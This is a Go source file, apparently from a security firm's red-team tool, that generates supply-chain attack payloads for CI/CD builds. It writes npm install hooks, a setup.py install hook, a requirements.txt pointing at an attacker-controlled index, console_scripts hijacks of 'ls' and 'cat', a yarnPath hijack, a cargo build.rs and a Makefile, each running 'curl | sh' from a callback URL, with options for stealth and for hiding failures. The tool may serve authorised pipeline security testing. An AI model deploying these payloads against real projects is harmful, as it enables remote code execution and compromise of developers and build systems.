// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package lotp

import (
	"encoding/json"
	"fmt"
	"strings"
)

// PayloadOptions configures payload generation.
type PayloadOptions struct {
	Command      string // Command to execute
	CallbackURL  string // URL for exfiltration callbacks
	Stealth      bool   // Minimize detection signals
	PreserveFlow bool   // Don't break the normal build
}

// GeneratedPayload is a ready-to-use LOTP payload.
type GeneratedPayload struct {
	Technique   string            // Which technique this uses
	File        string            // File to create/modify
	Content     string            // File content
	Description string            // What this does
	Trigger     string            // What triggers execution
	Properties  map[string]string // Additional properties
}

type GeneratedFile struct {
	Path    string
	Content string
}

// NPMPayload generates package.json payloads for npm install hooks.
type NPMPayload struct {
	Options PayloadOptions
}

// NewNPMPayload creates a new NPM payload generator.
func NewNPMPayload(opts PayloadOptions) *NPMPayload {
	return &NPMPayload{Options: opts}
}

func GenerateFiles(tool string, targets []string, callbackURL string) []GeneratedFile {
	switch ResolveTechnique(tool, "") {
	case "bash", "powershell", "python":
		return generateScriptFiles(tool, targets, callbackURL)
	default:
		payload := RecommendBestPayload([]Technique{{Name: ResolveTechnique(tool, "")}}, PayloadOptions{
			CallbackURL: callbackURL,
		})
		if payload == nil {
			return nil
		}
		return generatedPayloadFiles(payload)
	}
}

// Generate creates npm package.json payloads.
func (n *NPMPayload) Generate() []GeneratedPayload {
	var payloads []GeneratedPayload

	// Determine the best command based on options
	var cmd string
	switch {
	case n.Options.CallbackURL != "":
		cmd = CurlPipeShCommand(n.Options.CallbackURL)
	case n.Options.Command != "":
		cmd = n.Options.Command
	default:
		cmd = "id"
	}

	// Bash command via preinstall and postinstall
	payloads = append(payloads,
		GeneratedPayload{
			Technique:   "npm",
			File:        "package.json",
			Content:     n.generatePackageJSON("preinstall", cmd),
			Description: "Execute shell command before npm install",
			Trigger:     "npm install",
			Properties:  map[string]string{"hook": "preinstall", "type": "shell"},
		},
		GeneratedPayload{
			Technique:   "npm",
			File:        "package.json",
			Content:     n.generatePackageJSON("postinstall", cmd),
			Description: "Execute shell command after npm install",
			Trigger:     "npm install",
			Properties:  map[string]string{"hook": "postinstall", "type": "shell"},
		})

	// Node.js via postinstall (more capabilities)
	nodeCmd := fmt.Sprintf("node -e \"require('child_process').execSync('%s',{stdio:'inherit'})\"", escapeJS(cmd))
	payloads = append(payloads, GeneratedPayload{
		Technique:   "npm",
		File:        "package.json",
		Content:     n.generatePackageJSON("postinstall", nodeCmd),
		Description: "Execute Node.js code after npm install",
		Trigger:     "npm install",
		Properties:  map[string]string{"hook": "postinstall", "type": "node"},
	})

	// prepare hook (runs on git clone of the package)
	if !n.Options.Stealth {
		payloads = append(payloads, GeneratedPayload{
			Technique:   "npm",
			File:        "package.json",
			Content:     n.generatePackageJSON("prepare", cmd),
			Description: "Execute on package prepare (git install)",
			Trigger:     "npm install <git-url>",
			Properties:  map[string]string{"hook": "prepare", "type": "shell"},
		})
	}

	return payloads
}

// generatePackageJSON creates a minimal package.json with the given hook.
func (n *NPMPayload) generatePackageJSON(hook, cmd string) string {
	pkg := map[string]any{
		"name":    "legitimate-package",
		"version": "1.0.0",
		"scripts": map[string]string{
			hook: cmd,
		},
	}

	// Add preservation if requested
	if n.Options.PreserveFlow {
		if scripts, ok := pkg["scripts"].(map[string]string); ok {
			// Add a successful exit
			scripts[hook] = cmd + " || true"
		}
	}

	data, _ := json.MarshalIndent(pkg, "", "  ")
	return string(data)
}

// PipPayload generates Python package payloads.
type PipPayload struct {
	Options PayloadOptions
}

// NewPipPayload creates a new pip payload generator.
func NewPipPayload(opts PayloadOptions) *PipPayload {
	return &PipPayload{Options: opts}
}

// Generate creates pip/setuptools payloads.
func (p *PipPayload) Generate() []GeneratedPayload {
	var payloads []GeneratedPayload

	cmd := p.Options.Command
	switch {
	case p.Options.CallbackURL != "":
		cmd = CurlPipeShCommand(p.Options.CallbackURL)
	case cmd == "":
		cmd = "id"
	}

	// setup.py with install hook
	setupPy := fmt.Sprintf(`from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        os.system(%q)
        install.run(self)

setup(
    name='legitimate-package',
    version='1.0.0',
    cmdclass={'install': CustomInstall},
)
`, cmd)

	payloads = append(payloads, GeneratedPayload{
		Technique:   "pip",
		File:        "setup.py",
		Content:     setupPy,
		Description: "Execute command during pip install",
		Trigger:     "pip install .",
		Properties:  map[string]string{"hook": "install", "type": "python"},
	})

	// requirements.txt with malicious index
	if p.Options.CallbackURL != "" {
		reqTxt := fmt.Sprintf(`# Redirect to attacker-controlled index
-i %s
legitimate-package
`, p.Options.CallbackURL)

		payloads = append(payloads, GeneratedPayload{
			Technique:   "pip",
			File:        "requirements.txt",
			Content:     reqTxt,
			Description: "Redirect pip to attacker-controlled index",
			Trigger:     "pip install -r requirements.txt",
			Properties:  map[string]string{"type": "index_redirect"},
		})
	}

	// pyproject.toml with console_scripts hijacking
	pyproject := `[build-system]
requires = ["setuptools>=61.0"]
build-backend = "setuptools.build_meta"

[project]
name = "legitimate-package"
version = "1.0.0"

[project.scripts]
# Hijack common commands
ls = "malicious:main"
cat = "malicious:main"
`

	maliciousPy := fmt.Sprintf(`import os
def main():
    os.system(%q)
    # Optionally call the real command
`, cmd)

	payloads = append(payloads, GeneratedPayload{
		Technique:   "pip",
		File:        "pyproject.toml",
		Content:     pyproject,
		Description: "Hijack common commands via console_scripts",
		Trigger:     "pip install . && ls",
		Properties:  map[string]string{"type": "command_hijack", "extra_file": "malicious.py:" + maliciousPy},
	})

	return payloads
}

// YarnPayload generates Yarn payloads.
type YarnPayload struct {
	Options PayloadOptions
}

// NewYarnPayload creates a new Yarn payload generator.
func NewYarnPayload(opts PayloadOptions) *YarnPayload {
	return &YarnPayload{Options: opts}
}

// Generate creates yarn payloads.
func (y *YarnPayload) Generate() []GeneratedPayload {
	var payloads []GeneratedPayload

	cmd := y.Options.Command
	switch {
	case y.Options.CallbackURL != "":
		cmd = CurlPipeShCommand(y.Options.CallbackURL)
	case cmd == "":
		cmd = "id"
	}

	// .yarnrc.yml with yarnPath
	yarnrc := `yarnPath: "./pwn.js"
`
	pwnJS := fmt.Sprintf(`#!/usr/bin/env node
require('child_process').execSync(%q, {stdio: 'inherit'});
`, cmd)

	payloads = append(payloads, GeneratedPayload{
		Technique:   "yarn",
		File:        ".yarnrc.yml",
		Content:     yarnrc,
		Description: "Hijack yarn via yarnPath",
		Trigger:     "yarn install",
		Properties:  map[string]string{"type": "path_hijack", "extra_file": "pwn.js:" + pwnJS},
	})

	return payloads
}

// CargoPayload generates Rust/Cargo payloads.
type CargoPayload struct {
	Options PayloadOptions
}

// NewCargoPayload creates a new Cargo payload generator.
func NewCargoPayload(opts PayloadOptions) *CargoPayload {
	return &CargoPayload{Options: opts}
}

// Generate creates cargo payloads.
func (c *CargoPayload) Generate() []GeneratedPayload {
	var payloads []GeneratedPayload

	cmd := c.Options.Command
	switch {
	case c.Options.CallbackURL != "":
		cmd = CurlPipeShCommand(c.Options.CallbackURL)
	case cmd == "":
		cmd = "id"
	}

	// build.rs
	buildRs := fmt.Sprintf(`fn main() {
    let _ = std::process::Command::new("sh")
        .arg("-c")
        .arg(%q)
        .output();
}
`, cmd)

	payloads = append(payloads, GeneratedPayload{
		Technique:   "cargo",
		File:        "build.rs",
		Content:     buildRs,
		Description: "Execute command during cargo build",
		Trigger:     "cargo build",
		Properties:  map[string]string{"type": "build_script"},
	})

	return payloads
}

// MakePayload generates Makefile payloads.
type MakePayload struct {
	Options PayloadOptions
}

// NewMakePayload creates a new Make payload generator.
func NewMakePayload(opts PayloadOptions) *MakePayload {
	return &MakePayload{Options: opts}
}

// Generate creates Makefile payloads.
func (m *MakePayload) Generate() []GeneratedPayload {
	var payloads []GeneratedPayload

	cmd := m.Options.Command
	switch {
	case m.Options.CallbackURL != "":
		cmd = CurlPipeShCommand(m.Options.CallbackURL)
	case cmd == "":
		cmd = "id"
	}

	makefile := fmt.Sprintf(`.PHONY: all
all:
	@%s
`, cmd)

	payloads = append(payloads, GeneratedPayload{
		Technique:   "make",
		File:        "Makefile",
		Content:     makefile,
		Description: "Execute command on make",
		Trigger:     "make",
		Properties:  map[string]string{"type": "target_hijack"},
	})

	return payloads
}

// DetectAvailableVectors analyzes a file list and returns applicable LOTP techniques.
func DetectAvailableVectors(files, commands []string) []Technique {
	seen := make(map[string]bool)
	var result []Technique

	// Check files
	for _, f := range files {
		for _, t := range FindByFile(f) {
			if !seen[t.Name] {
				seen[t.Name] = true
				result = append(result, t)
			}
		}
	}

	// Check commands
	for _, c := range commands {
		for _, t := range FindByCommand(c) {
			if !seen[t.Name] {
				seen[t.Name] = true
				result = append(result, t)
			}
		}
	}

	return result
}

// RecommendBestPayload suggests the best payload for a given context.
func RecommendBestPayload(techniques []Technique, opts PayloadOptions) *GeneratedPayload {
	// Priority order for common CI/CD scenarios
	priority := []string{"npm", "pip", "yarn", "make", "cargo", "bundler", "composer"}

	for _, name := range priority {
		for _, t := range techniques {
			if strings.EqualFold(t.Name, name) {
				return generatePayloadForTechnique(name, opts)
			}
		}
	}

	// Fallback to first available
	if len(techniques) > 0 {
		return generatePayloadForTechnique(strings.ToLower(techniques[0].Name), opts)
	}

	return nil
}

func generatePayloadForTechnique(name string, opts PayloadOptions) *GeneratedPayload {
	var payloads []GeneratedPayload
	name = NormalizeTechnique(name)

	switch name {
	case "npm":
		payloads = NewNPMPayload(opts).Generate()
	case "pip":
		payloads = NewPipPayload(opts).Generate()
	case "yarn":
		payloads = NewYarnPayload(opts).Generate()
	case "cargo":
		payloads = NewCargoPayload(opts).Generate()
	case "make":
		payloads = NewMakePayload(opts).Generate()
	}

	if len(payloads) > 0 {
		if opts.CallbackURL != "" {
			for i := range payloads {
				if strings.Contains(payloads[i].Content, opts.CallbackURL) {
					return &payloads[i]
				}
				for _, value := range payloads[i].Properties {
					if strings.Contains(value, opts.CallbackURL) {
						return &payloads[i]
					}
				}
			}
		}
		return &payloads[0]
	}
	return nil
}

// escapeJS escapes a string for use in JavaScript single quotes.
func escapeJS(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "'", "\\'")
	return s
}

func CurlPipeShCommand(callbackURL string) string {
	return fmt.Sprintf("curl -s '%s' | sh", shellEscape(callbackURL))
}

func shellEscape(s string) string {
	return strings.ReplaceAll(s, "'", "'\"'\"'")
}

func powershellSingleQuoteEscape(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}

func PowershellCurlPipeShCommand(callbackURL string) string {
	return fmt.Sprintf("sh -c '%s'", powershellSingleQuoteEscape(CurlPipeShCommand(callbackURL)))
}

func generateScriptFiles(tool string, targets []string, callbackURL string) []GeneratedFile {
	var shebang, payload string
	switch strings.ToLower(strings.TrimSpace(tool)) {
	case "powershell":
		shebang = "#!/usr/bin/env pwsh"
		payload = PowershellCurlPipeShCommand(callbackURL)
	case "python":
		shebang = "#!/usr/bin/env python3"
		payload = fmt.Sprintf("import os; os.system(%q)", CurlPipeShCommand(callbackURL))
	default:
		shebang = "#!/bin/sh"
		payload = CurlPipeShCommand(callbackURL)
	}

	content := shebang + "\n" + payload + "\n"

	var files []GeneratedFile
	for _, target := range targets {
		files = append(files, GeneratedFile{Path: target, Content: content})
	}
	if len(files) == 0 {
		files = append(files, GeneratedFile{Path: "scripts/build.sh", Content: content})
	}
	return files
}

func generatedPayloadFiles(payload *GeneratedPayload) []GeneratedFile {
	files := []GeneratedFile{{Path: payload.File, Content: payload.Content}}

	if extra, ok := payload.Properties["extra_file"]; ok {
		if idx := strings.Index(extra, ":"); idx > 0 {
			files = append(files, GeneratedFile{Path: extra[:idx], Content: extra[idx+1:]})
		}
	}

	return files
}
